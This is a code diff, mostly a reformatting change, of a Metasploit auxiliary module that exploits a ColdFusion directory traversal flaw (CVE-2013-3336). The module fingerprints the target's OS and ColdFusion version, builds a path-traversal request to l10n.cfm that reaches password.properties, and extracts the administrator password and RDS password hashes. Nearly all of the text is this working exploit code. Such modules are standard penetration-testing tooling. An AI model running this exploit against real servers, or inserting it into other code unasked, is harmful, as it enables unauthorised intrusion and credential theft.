@@ -8,43 +8,50 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => "ColdFusion 'password.properties' Hash Extraction",
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => "ColdFusion 'password.properties' Hash Extraction",
+        'Description' => %q{
           This module uses a directory traversal vulnerability to extract information
-        such as password, rdspassword, and "encrypted" properties. This module has been
-        tested successfully on ColdFusion 9 and ColdFusion 10 (auto-detect).
-      },
-      'References'     =>
-        [
+          such as password, rdspassword, and "encrypted" properties. This module has been
+          tested successfully on ColdFusion 9 and ColdFusion 10 (auto-detect).
+        },
+        'References' => [
           [ 'CVE', '2013-3336' ],
           [ 'OSVDB', '93114' ],
           [ 'EDB', '25305' ]
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'HTP',
           'sinn3r',
           'nebulus'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2013-05-07'  #The day we saw the subzero poc
-    ))
+        'License' => MSF_LICENSE,
+        # The day we saw the subzero poc
+        'DisclosureDate' => '2013-05-07',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(80),
         OptString.new("TARGETURI", [true, 'Base path to ColdFusion', '/'])
-      ])
+      ]
+    )
   end
 
   def fingerprint(response)
-
-    if(response.headers.has_key?('Server') )
-      if(response.headers['Server'] =~ /IIS/ or response.headers['Server'] =~ /\(Windows/)
+    if (response.headers.has_key?('Server'))
+      if (response.headers['Server'] =~ /IIS/ or response.headers['Server'] =~ /\(Windows/)
         os = "Windows (#{response.headers['Server']})"
-      elsif(response.headers['Server'] =~ /Apache\//)
-          os = "Unix (#{response.headers['Server']})"
+      elsif (response.headers['Server'] =~ /Apache\//)
+        os = "Unix (#{response.headers['Server']})"
       else
         os = response.headers['Server']
       end
@@ -54,41 +61,41 @@ class MetasploitModule < Msf::Auxiliary
 
     title = "Not Found"
     response.body.gsub!(/[\r\n]/, '')
-    if(response.body =~ /<title.*\/?>(.+)<\/title\/?>/i)
+    if (response.body =~ /<title.*\/?>(.+)<\/title\/?>/i)
       title = $1
       title.gsub!(/\s/, '')
     end
-    return nil  if( title == 'Not Found' or not title =~ /ColdFusionAdministrator/)
+    return nil if (title == 'Not Found' or not title =~ /ColdFusionAdministrator/)
 
     out = nil
 
-    if(response.body =~ />\s*Version:\s*(.*)<\/strong\><br\s\//)
+    if (response.body =~ />\s*Version:\s*(.*)<\/strong\><br\s\//)
       v = $1
       out = (v =~ /^6/) ? "Adobe ColdFusion MX6 (Not Vulnerable)" : "Adobe ColdFusion MX7 (Not Vulnerable)"
-    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright 1995-2012 Adobe/ and response.body =~ /Administrator requires a browser that supports frames/ )
+    elsif (response.body =~ /<meta name=\"Author\" content=\"Copyright 1995-2012 Adobe/ and response.body =~ /Administrator requires a browser that supports frames/)
       out = "Adobe ColdFusion MX7 (Not Vulnerable)"
-    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2006 Adobe/)
+    elsif (response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2006 Adobe/)
       out = "Adobe ColdFusion 8 (Not Vulnerable)"
-    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2010 Adobe/ and
+    elsif (response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2010 Adobe/ and
       response.body =~ /1997\-2012 Adobe Systems Incorporated and its licensors/)
       out = "Adobe ColdFusion 10"
-    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2010 Adobe/ or
+    elsif (response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2010 Adobe/ or
       response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2009 Adobe Systems\, Inc\. All rights reserved/)
       out = "Adobe ColdFusion 9"
-    elsif(response.body =~ /<meta name=\"Keywords\" content=\"(.*)\">\s+<meta name/)
+    elsif (response.body =~ /<meta name=\"Keywords\" content=\"(.*)\">\s+<meta name/)
       out = $1.split(/,/)[0]
     else
       out = 'Unknown ColdFusion'
     end
 
-    if(title.downcase == 'coldfusionadministrator')
+    if (title.downcase == 'coldfusionadministrator')
       out << " (you have administrator access)"
     end
 
     out << " (#{os})"
     file = ''
     trav = ''
-    if(os =~ /Windows/ )
+    if (os =~ /Windows/)
       trav = '..\..\..\..\..\..\..\..\..\..'
       file = (out =~ /ColdFusion 9/) ? '\ColdFusion9\lib\password.properties' : '\ColdFusion10\CFusion\lib\password.properties'
     else
@@ -96,13 +103,13 @@ class MetasploitModule < Msf::Auxiliary
       file = (out =~ /ColdFusion 9/) ? '/opt/coldfusion9/lib/password.properties' : '/opt/coldfusion10/cfusion/lib/password.properties'
     end
 
-    if(response.body =~ /Adobe/ and response.body =~ /ColdFusion/ and file == '')
+    if (response.body =~ /Adobe/ and response.body =~ /ColdFusion/ and file == '')
       print_error("#{peer} Fingerprint failed...aborting")
       print_status("response: #{response.body}")
-      return nil,nil
+      return nil, nil
     end
 
-    return out,"#{trav}#{file}"
+    return out, "#{trav}#{file}"
   end
 
   def check
@@ -117,26 +124,26 @@ class MetasploitModule < Msf::Auxiliary
     vuln = false
     url = '/CFIDE/adminapi/customtags/l10n.cfm'
     res = send_request_cgi({
+      'uri' => url,
+      'method' => 'GET',
+      'Connection' => "keep-alive",
+      'Accept-Encoding' => "zip,deflate",
+    })
+
+    if (res != nil)
+      # can't stack b/c res.code won't exist if res is nil
+      vuln = true if (res.code == 500 and res.body =~ /attributes\.id was not provided/)
+    end
+
+    if (vuln)
+      url = '/CFIDE/administrator/mail/download.cfm'
+      res = send_request_cgi({
         'uri' => url,
         'method' => 'GET',
         'Connection' => "keep-alive",
         'Accept-Encoding' => "zip,deflate",
-        })
-
-    if(res != nil)
-    # can't stack b/c res.code won't exist if res is nil
-      vuln = true if(res.code == 500 and res.body =~ /attributes\.id was not provided/)
-    end
-
-    if(vuln)
-      url = '/CFIDE/administrator/mail/download.cfm'
-      res = send_request_cgi({
-          'uri' => url,
-          'method' => 'GET',
-          'Connection' => "keep-alive",
-          'Accept-Encoding' => "zip,deflate",
-          })
-      if(res != nil)
+      })
+      if (res != nil)
         vuln = false if (res.code != 200)
       end
     end
@@ -144,18 +151,17 @@ class MetasploitModule < Msf::Auxiliary
     return vuln
   end
 
-
   def run
     filename = ""
 
     url = '/CFIDE/administrator/index.cfm'
     # print_status("Getting index...")
     res = send_request_cgi({
-        'uri' => url,
-        'method' => 'GET',
-        'Connection' => "keep-alive",
-        'Accept-Encoding' => "zip,deflate",
-        })
+      'uri' => url,
+      'method' => 'GET',
+      'Connection' => "keep-alive",
+      'Accept-Encoding' => "zip,deflate",
+    })
     # print_status("Got back: #{res.inspect}")
     return if not res
     return if not res.body or not res.code
@@ -164,31 +170,31 @@ class MetasploitModule < Msf::Auxiliary
     out, filename = fingerprint(res)
     print_status("#{peer} #{out}") if out
 
-    if(out =~ /Not Vulnerable/)
+    if (out =~ /Not Vulnerable/)
       print_status("#{peer} isn't vulnerable to this attack")
       return
     end
 
-    if(not check_cf)
+    if (not check_cf)
       print_status("#{peer} can't be exploited (either files missing or permissions block access)")
       return
     end
 
     res = send_request_cgi({
-      'method'   => 'GET',
-      'uri'      => normalize_uri(target_uri.path, 'CFIDE', 'adminapi', 'customtags', 'l10n.cfm'),
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'CFIDE', 'adminapi', 'customtags', 'l10n.cfm'),
       'encode_params' => false,
       'encode' => false,
       'vars_get' => {
-        'attributes.id'            => 'it',
-        'attributes.file'          => '../../administrator/mail/download.cfm',
-        'filename'                 => filename,
-        'attributes.locale'        => 'it',
-        'attributes.var'           => 'it',
-        'attributes.jscript'       => 'false',
-        'attributes.type'          => 'text/html',
-        'attributes.charset'       => 'UTF-8',
-        'thisTag.executionmode'    => 'end',
+        'attributes.id' => 'it',
+        'attributes.file' => '../../administrator/mail/download.cfm',
+        'filename' => filename,
+        'attributes.locale' => 'it',
+        'attributes.var' => 'it',
+        'attributes.jscript' => 'false',
+        'attributes.type' => 'text/html',
+        'attributes.charset' => 'UTF-8',
+        'thisTag.executionmode' => 'end',
         'thisTag.generatedContent' => 'htp'
       }
     })
@@ -198,9 +204,9 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    rdspass   = res.body.scan(/^rdspassword=(.+)/).flatten[0] || ''
-    password  = res.body.scan(/^password=(.+)/).flatten[0]    || ''
-    encrypted = res.body.scan(/^encrypted=(.+)/).flatten[0]   || ''
+    rdspass = res.body.scan(/^rdspassword=(.+)/).flatten[0] || ''
+    password = res.body.scan(/^password=(.+)/).flatten[0] || ''
+    encrypted = res.body.scan(/^encrypted=(.+)/).flatten[0] || ''
 
     if rdspass.empty? and password.empty?
       # No pass collected, no point to store anything
